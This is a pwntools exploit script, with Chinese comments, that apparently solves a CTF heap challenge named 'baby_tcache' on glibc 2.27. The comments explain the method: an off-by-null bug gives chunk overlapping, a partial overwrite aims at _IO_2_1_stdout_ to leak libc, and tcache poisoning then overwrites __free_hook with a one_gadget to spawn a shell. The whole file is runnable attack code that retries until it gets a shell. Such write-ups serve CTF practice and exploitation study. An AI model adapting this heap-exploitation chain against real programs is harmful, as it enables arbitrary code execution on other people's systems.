#这道题漏洞点在于off_by_null,可以借此实现chunk overlapping,即覆盖pre in use以及篡改pre_size实现向前合并
#需要注意的是这道题是2.27，所以没有对于pre_size与size的检查，但是有对unlink的检查，所以presize对应的前面的堆块需要位于双向链表(unsorted bin)
#为了使chunk能跳过tcache直接进入unsorted bin,需要使chunk大小大于0x410

#另外，这道题还用了部分覆盖，首先通过unsortedbin切割使指向libc的fd留在一个tcache_chunk的next处，再部分覆盖使其指向_IO_2_1_stdout_
#接着就利用_IO_2_1_stdout_来泄露libc地址，最后再利用一次tcache poisoning来覆盖__free_hook为one_gadget,从而实现getshell

from pwn import*
import sys
context.log_level = 'debug'

elf=ELF('./baby_tcache')
libc=ELF('./libc.so.6')


def add(size,data):
    p.sendlineafter('choice: ','1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(data)

def delete(index):
    p.sendlineafter('choice: ','2')
    p.recvuntil('Index:')
    p.sendline(str(index))

# gdb.attach(p,'''
# b* free
# b* malloc''')
while True:
    try:
        p=process('./baby_tcache')
        add(0x4f8,'a')
        add(0x30,'a')
        add(0x40,'a')
        add(0x50,'a')
        add(0x60,'a')
        add(0x4f8,'a')
        add(0x60,'a')

        delete(4)
        add(0x68,b'a'*0x60+b'\x60\x06')
        delete(2)
        delete(0)
        delete(5)
        add(0x530,b'a')
        delete(4)
        add(0xa0,b'\x60\x17')
        add(0x40,b'a')

        payload=p64(0xfbad1800) + p64(0) * 3 + b'\x00'
        add(0x3e,payload)
        p.recv(8)
        addr=p.recv(8)
        libc_base=u64(addr)-0x3ed8b0
        print(f'--------------------------------------------------------------------------------------------------------------------------------------------------------------------------libc_base:{hex(libc_base)}')
        free_hook=libc_base+libc.symbols['__free_hook']
        one_gadget=libc_base+0x4f322

        add(0x90,p64(free_hook))
        add(0x60,b'a')
        add(0x60,p64(one_gadget))
        delete(6)
          
        p.sendline(b'echo Pwned')
        p.sendline(b'echo Pwned')
        result=p.recvuntil(b'Pwned',timeout=0.2)
        if b'Pwned' in result:
            print('Exploit successful!')
            p.interactive()
            break
        p.close()
    except KeyboardInterrupt:
        p.close()
        sys.exit(0)

    except Exception as e:
        print(e)
        p.close()
        continue

